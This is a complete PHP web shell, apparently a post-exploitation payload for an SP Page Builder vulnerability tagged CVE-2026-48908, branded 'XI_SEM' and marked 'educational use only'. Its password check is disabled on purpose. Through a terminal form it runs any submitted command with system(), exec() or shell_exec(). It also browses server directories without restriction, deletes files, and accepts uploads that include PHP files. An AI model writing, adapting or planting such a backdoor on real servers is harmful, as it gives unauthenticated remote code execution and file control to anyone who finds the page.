<?php
/*
    ██╗  ██╗██╗   ███████╗███████╗███╗   ███╗
    ╚██╗██╔╝██║   ██╔════╝██╔════╝████╗ ████║
     ╚███╔╝ ██║   ███████╗█████╗  ██╔████╔██║
     ██╔██╗ ██║   ╚════██║██╔══╝  ██║╚██╔╝██║
    ██╔╝ ██╗██║   ███████║███████╗██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚═╝   ╚══════╝╚══════╝╚═╝     ╚═╝

    { XI_SEM } - CVE-2026-48908
    SP Page Builder Unauthenticated RCE Shell
    Version: 1.0 (NO PASSWORD - EDUCATIONAL USE ONLY)
*/

// ============================================================
// 🔓 SECURITY CONFIGURATION - NO PASSWORD REQUIRED!
// ============================================================

// Password disabled - direct access
$auth_pass = ''; // EMPTY - NO PASSWORD NEEDED

// Session timeout (seconds)
$session_timeout = 3600; // 1 hour

// Allowed file extensions for upload
$allowed_extensions = ['php', 'txt', 'html', 'js', 'css', 'jpg', 'png', 'gif', 'pdf', 'xml', 'json', 'svg', 'webp'];

// Maximum file size (in bytes)
$max_file_size = 10 * 1024 * 1024; // 10MB

// ============================================================
// 🛡️ SECURITY HEADERS & CONFIGURATION
// ============================================================

session_start();
error_reporting(0);
set_time_limit(0);

// Security headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: strict-origin-when-cross-origin');

// ============================================================
// 🔓 AUTHENTICATION DISABLED - DIRECT ACCESS
// ============================================================

function check_auth() {
    // 🔓 PASSWORD DISABLED - Always return true
    return true;
}

function login_shell($error = '') {
    // This function is now bypassed - directly shows shell
    // Redirect to shell page without password
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// 🔓 AUTO-LOGIN - No password required
$_SESSION['authenticated'] = true;
$_SESSION['login_time'] = time();

// ============================================================
// 📁 CORE FUNCTIONALITY
// ============================================================

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir) ?: getcwd();
chdir($current_dir);

if (strpos($current_dir, '/') !== 0 && strpos($current_dir, ':/') === false) {
    $current_dir = getcwd();
    chdir($current_dir);
}

// ============================================================
// 🗑️ DELETE FUNCTION
// ============================================================

if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['file'])) {
    $file_path = realpath($_GET['file']);
    
    if ($file_path && strpos($file_path, $current_dir) === 0) {
        if (is_file($file_path)) {
            if (unlink($file_path)) {
                $message = '✅ File deleted successfully!';
            } else {
                $message = '❌ Failed to delete file!';
            }
        } else {
            $message = '❌ Not a valid file!';
        }
    } else {
        $message = '❌ Access denied!';
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
    exit;
}

// ============================================================
// 📤 UPLOAD FUNCTION
// ============================================================

$upload_message = '';
if (isset($_POST['upload'])) {
    if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
        $file_name = basename($_FILES['uploaded_file']['name']);
        $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
        $file_size = $_FILES['uploaded_file']['size'];
        $target_path = $current_dir . '/' . $file_name;
        
        if (!in_array($file_ext, $allowed_extensions)) {
            $upload_message = '❌ File extension not allowed!';
        } else if ($file_size > $max_file_size) {
            $upload_message = '❌ File too large! Max 10MB.';
        } else if (file_exists($target_path)) {
            $upload_message = '❌ File already exists!';
        } else if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_path)) {
            $upload_message = '✅ File uploaded successfully!';
        } else {
            $upload_message = '❌ Upload failed!';
        }
    } else {
        $upload_message = '❌ No file uploaded or upload error!';
    }
}

// ============================================================
// 🎨 INTERFACE
// ============================================================

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{ XI_SEM } - CVE-2026-48908 Shell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Anonymous+Pro:wght@400;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Anonymous Pro', monospace;
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 255, 0, 0.02);
            border: 1px solid rgba(0, 255, 0, 0.1);
            border-radius: 8px;
            padding: 20px;
            position: relative;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                linear-gradient(rgba(0,255,0,0.01) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0,255,0,0.01) 1px, transparent 1px);
            background-size: 30px 30px;
            pointer-events: none;
            border-radius: 8px;
        }
        
        .header {
            border-bottom: 2px solid #00ff00;
            padding-bottom: 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            position: relative;
            z-index: 1;
        }
        
        .logo {
            font-size: 20px;
            font-weight: 700;
            color: #00ff00;
            text-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        
        .logo span {
            color: #ff3300;
            text-shadow: 0 0 20px rgba(255, 51, 0, 0.2);
        }
        
        .header-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 8px 16px;
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            border-radius: 4px;
            color: #00ff00;
            font-family: 'Anonymous Pro', monospace;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            font-size: 13px;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .btn:hover {
            background: #00ff00;
            color: #0a0a0a;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        
        .btn-danger {
            border-color: #ff3300;
            color: #ff3300;
        }
        
        .btn-danger:hover {
            background: #ff3300;
            color: #0a0a0a;
            box-shadow: 0 0 20px rgba(255, 51, 0, 0.2);
        }
        
        .btn-warning {
            border-color: #ffaa00;
            color: #ffaa00;
        }
        
        .btn-warning:hover {
            background: #ffaa00;
            color: #0a0a0a;
            box-shadow: 0 0 20px rgba(255, 170, 0, 0.2);
        }
        
        .btn-sm {
            padding: 4px 10px;
            font-size: 11px;
        }
        
        .btn-terminal {
            border-color: #00ccff;
            color: #00ccff;
        }
        
        .btn-terminal:hover {
            background: #00ccff;
            color: #0a0a0a;
        }
        
        .path {
            background: rgba(0, 255, 0, 0.05);
            padding: 10px 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            word-break: break-all;
            border-left: 3px solid #00ff00;
            position: relative;
            z-index: 1;
        }
        
        .path a {
            color: #00ff00;
            text-decoration: none;
        }
        
        .path a:hover {
            text-decoration: underline;
        }
        
        .terminal-area {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(0, 255, 0, 0.2);
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }
        
        .terminal-area .prompt {
            color: #00ff00;
            font-size: 14px;
        }
        
        .terminal-area input[type="text"] {
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: 'Anonymous Pro', monospace;
            font-size: 14px;
            width: 80%;
            outline: none;
        }
        
        .terminal-area input[type="text"]:focus {
            outline: none;
        }
        
        .terminal-output {
            background: rgba(0, 0, 0, 0.5);
            padding: 10px;
            border-radius: 4px;
            margin-top: 10px;
            font-size: 13px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
            color: #00ff00;
        }
        
        .upload-area {
            background: rgba(0, 255, 0, 0.03);
            border: 1px dashed rgba(0, 255, 0, 0.3);
            border-radius: 4px;
            padding: 20px;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }
        
        .upload-area form {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }
        
        .upload-area input[type="file"] {
            color: #00ff00;
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid rgba(0, 255, 0, 0.2);
            padding: 10px;
            border-radius: 4px;
            flex: 1;
            min-width: 200px;
        }
        
        .upload-area input[type="file"]::file-selector-button {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            border-radius: 4px;
            padding: 5px 10px;
            color: #00ff00;
            cursor: pointer;
            font-family: 'Anonymous Pro', monospace;
            margin-right: 10px;
        }
        
        .upload-area input[type="file"]::file-selector-button:hover {
            background: #00ff00;
            color: #0a0a0a;
        }
        
        .message {
            padding: 10px 15px;
            border-radius: 4px;
            margin-bottom: 15px;
            font-size: 14px;
            position: relative;
            z-index: 1;
        }
        
        .message.success {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            color: #00ff00;
        }
        
        .message.error {
            background: rgba(255, 51, 0, 0.1);
            border: 1px solid #ff3300;
            color: #ff3300;
        }
        
        .message.info {
            background: rgba(0, 204, 255, 0.1);
            border: 1px solid #00ccff;
            color: #00ccff;
        }
        
        .file-list {
            position: relative;
            z-index: 1;
        }
        
        .file-list table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        
        .file-list th {
            text-align: left;
            padding: 10px 12px;
            border-bottom: 2px solid rgba(0, 255, 0, 0.2);
            color: rgba(0, 255, 0, 0.6);
            font-weight: 400;
            letter-spacing: 1px;
            font-size: 12px;
        }
        
        .file-list td {
            padding: 8px 12px;
            border-bottom: 1px solid rgba(0, 255, 0, 0.05);
            font-size: 14px;
        }
        
        .file-list tr:hover {
            background: rgba(0, 255, 0, 0.03);
        }
        
        .file-list .folder {
            color: #ffaa00;
        }
        
        .file-list .file {
            color: #00ccff;
        }
        
        .file-list .actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .file-list .actions .btn {
            font-size: 10px;
            padding: 3px 8px;
        }
        
        .footer {
            text-align: center;
            padding-top: 20px;
            margin-top: 20px;
            border-top: 1px solid rgba(0, 255, 0, 0.1);
            font-size: 12px;
            color: rgba(0, 255, 0, 0.3);
            position: relative;
            z-index: 1;
        }
        
        .footer a {
            color: rgba(0, 255, 0, 0.4);
            text-decoration: none;
        }
        
        .footer a:hover {
            color: #00ff00;
        }
        
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 10px;
            font-weight: 700;
        }
        
        .badge-vuln {
            background: rgba(255, 51, 0, 0.2);
            color: #ff3300;
            border: 1px solid rgba(255, 51, 0, 0.3);
        }
        
        .badge-safe {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border: 1px solid rgba(0, 255, 0, 0.2);
        }
        
        .scrollToTop {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 35px;
            height: 35px;
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            border-radius: 50%;
            color: #00ff00;
            text-align: center;
            line-height: 35px;
            cursor: pointer;
            transition: all 0.3s ease;
            z-index: 999;
        }
        
        .scrollToTop:hover {
            background: #00ff00;
            color: #0a0a0a;
        }
        
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .header { flex-direction: column; align-items: flex-start; }
            .upload-area form { flex-direction: column; }
            .upload-area input[type="file"] { width: 100%; }
            .file-list { overflow-x: auto; }
            .file-list table { font-size: 12px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                { <span>XI_SEM</span> } <span style="font-size:14px;color:rgba(0,255,0,0.5);">⚡ CVE-2026-48908 SHELL</span>
            </div>
            <div class="header-actions">
                <a href="<?php echo $_SERVER['PHP_SELF']; ?>?action=terminal" class="btn btn-terminal">💻 TERMINAL</a>
            </div>
        </div>
        
        <!-- Terminal -->
        <?php if (isset($_GET['action']) && $_GET['action'] === 'terminal'): ?>
        <div class="terminal-area">
            <div class="prompt">
                <span style="color:#00ff00;">┌──(</span><span style="color:#ff3300;"><?php echo get_current_user(); ?></span><span style="color:#00ff00;">㉿</span><span style="color:#00ccff;"><?php echo gethostname(); ?></span><span style="color:#00ff00;">)-[</span><span style="color:#00ccff;"><?php echo $current_dir; ?></span><span style="color:#00ff00;">]</span>
            </div>
            <div style="display:flex; align-items:center; margin-top:10px;">
                <span style="color:#00ff00;">└─# </span>
                <form method="POST" style="flex:1; display:flex;">
                    <input type="text" name="cmd" placeholder="Enter command..." autofocus style="flex:1;">
                    <button type="submit" name="execute" class="btn btn-sm" style="margin-left:5px;">▶</button>
                </form>
            </div>
            <?php
            if (isset($_POST['execute']) && isset($_POST['cmd'])) {
                $cmd = $_POST['cmd'];
                echo '<div class="terminal-output">';
                echo '<span style="color:#00ff00;">$ </span>' . htmlspecialchars($cmd) . "\n";
                if (function_exists('system')) {
                    system($cmd);
                } elseif (function_exists('exec')) {
                    exec($cmd, $output);
                    echo implode("\n", $output);
                } elseif (function_exists('shell_exec')) {
                    echo shell_exec($cmd);
                } else {
                    echo 'Command execution not available';
                }
                echo '</div>';
            }
            ?>
        </div>
        <?php endif; ?>
        
        <!-- Path -->
        <div class="path">
            📁 <strong>PATH:</strong> 
            <?php
            $parts = explode('/', $current_dir);
            $path_build = '';
            foreach ($parts as $index => $part) {
                if (empty($part)) continue;
                $path_build .= '/' . $part;
                $display = ($index === 0) ? $part : $part;
                echo '<a href="' . htmlspecialchars($_SERVER['PHP_SELF']) . '?dir=' . urlencode($path_build) . '">' . htmlspecialchars($display) . '</a>/';
            }
            ?>
        </div>
        
        <!-- Upload Area -->
        <div class="upload-area">
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="uploaded_file" required>
                <button type="submit" name="upload" class="btn">📤 UPLOAD</button>
                <?php if ($upload_message): ?>
                <span style="color: <?php echo strpos($upload_message, '✅') !== false ? '#00ff00' : '#ff3300'; ?>; font-size: 13px;">
                    <?php echo htmlspecialchars($upload_message); ?>
                </span>
                <?php endif; ?>
                <span style="font-size: 11px; color: rgba(0,255,0,0.4); margin-left: auto;">
                    Max: 10MB | Ext: <?php echo implode(', ', $allowed_extensions); ?>
                </span>
            </form>
        </div>
        
        <!-- File List -->
        <div class="file-list">
            <table>
                <thead>
                    <tr>
                        <th>NAME</th>
                        <th>SIZE</th>
                        <th>PERM</th>
                        <th>ACTIONS</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $items = scandir($current_dir);
                    $files = [];
                    $folders = [];
                    
                    foreach ($items as $item) {
                        if ($item === '.' || $item === '..') continue;
                        $full_path = $current_dir . '/' . $item;
                        if (is_dir($full_path)) {
                            $folders[] = $item;
                        } else {
                            $files[] = $item;
                        }
                    }
                    
                    sort($folders);
                    sort($files);
                    $all_items = array_merge($folders, $files);
                    
                    foreach ($all_items as $item):
                        $full_path = $current_dir . '/' . $item;
                        $is_dir = is_dir($full_path);
                        $size = $is_dir ? '--' : formatSize(filesize($full_path));
                        $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                    ?>
                    <tr>
                        <td>
                            <?php if ($is_dir): ?>
                            <span class="folder">📁</span>
                            <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']) . '?dir=' . urlencode($full_path); ?>" style="color:#ffaa00;text-decoration:none;">
                                <?php echo htmlspecialchars($item); ?>
                            </a>
                            <?php else: ?>
                            <span class="file">📄</span>
                            <a href="<?php echo htmlspecialchars($full_path); ?>" target="_blank" style="color:#00ccff;text-decoration:none;">
                                <?php echo htmlspecialchars($item); ?>
                            </a>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $size; ?></td>
                        <td><?php echo $perms; ?></td>
                        <td>
                            <div class="actions">
                                <?php if (!$is_dir): ?>
                                <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']) . '?action=delete&file=' . urlencode($full_path); ?>" 
                                   class="btn btn-danger btn-sm"
                                   onclick="return confirm('⚠️ Are you sure you want to delete: <?php echo addslashes($item); ?>?')">
                                    🗑️
                                </a>
                                <a href="<?php echo htmlspecialchars($full_path); ?>" target="_blank" class="btn btn-sm" style="border-color:#00ccff;color:#00ccff;">
                                    👁️
                                </a>
                                <?php endif; ?>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <span class="cursor-blink" style="display:inline-block;width:2px;height:12px;background:#00ff00;animation:blink 1s step-end infinite;vertical-align:middle;margin-right:5px;"></span>
            // CVE-2026-48908 POC - <a href="#">XI_SEM</a> &nbsp;|&nbsp; v1.0 (NO PASSWORD)
        </div>
    </div>
    
    <!-- Scroll to Top -->
    <div class="scrollToTop" onclick="window.scrollTo({top:0,behavior:'smooth'});">↑</div>
</body>
</html>
<?php

// ============================================================
// 📊 HELPER FUNCTIONS
// ============================================================

function formatSize($bytes) {
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

?>